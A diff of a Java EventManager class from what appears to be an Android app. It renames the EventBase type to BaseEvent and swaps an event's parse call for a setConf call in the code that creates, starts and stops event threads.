@@ -18,7 +18,7 @@ import com.android.service.util.Check;
 /**
  * The Class EventManager.
  */
-public class EventManager extends Manager<EventBase, Integer, String> {
+public class EventManager extends Manager<BaseEvent, Integer, String> {
 	/** The Constant TAG. */
 	private static final String TAG = "EventManager"; //$NON-NLS-1$
 
@@ -51,13 +51,13 @@ public class EventManager extends Manager<EventBase, Integer, String> {
 	 *            : Agent ID
 	 * @return the requested agent or null in case of error
 	 */
-	private EventBase createEvent(final String type, final EventConf conf) {
+	private BaseEvent createEvent(final String type, final EventConf conf) {
 
 		if (running.containsKey(conf.getId()) == true) {
 			return running.get(type);
 		}
 
-		final EventBase e = factory.create(type);
+		final BaseEvent e = factory.create(type);
 
 		if (e != null) {
 			running.put(conf.getId(), e);
@@ -103,10 +103,11 @@ public class EventManager extends Manager<EventBase, Integer, String> {
 				Check.asserts(pairs.getKey() == conf.getId(), "wrong mapping"); //$NON-NLS-1$
 			}
 
-			final EventBase e = createEvent(type, conf);
+			final BaseEvent e = createEvent(type, conf);
 
-			if (e != null) {
-				e.parse(conf);
+			if (e != null) {	
+				e.setConf(conf);
+				//e.parse(conf);
 
 				if (!e.isRunning()) {
 					final Thread t = new Thread(e);
@@ -138,15 +139,15 @@ public class EventManager extends Manager<EventBase, Integer, String> {
 	 */
 	@Override
 	public synchronized void stopAll() {
-		final Iterator<Map.Entry<Integer, EventBase>> it = running.entrySet().iterator();
+		final Iterator<Map.Entry<Integer, BaseEvent>> it = running.entrySet().iterator();
 
 		if (Cfg.DEBUG) {
 			Check.log( TAG + " (stopAll)") ;//$NON-NLS-1$
 		}
 
 		while (it.hasNext()) {
-			final Map.Entry<Integer, EventBase> pairs = it.next();
-			final EventBase event = pairs.getValue();
+			final Map.Entry<Integer, BaseEvent> pairs = it.next();
+			final BaseEvent event = pairs.getValue();
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Stopping: " + event) ;//$NON-NLS-1$
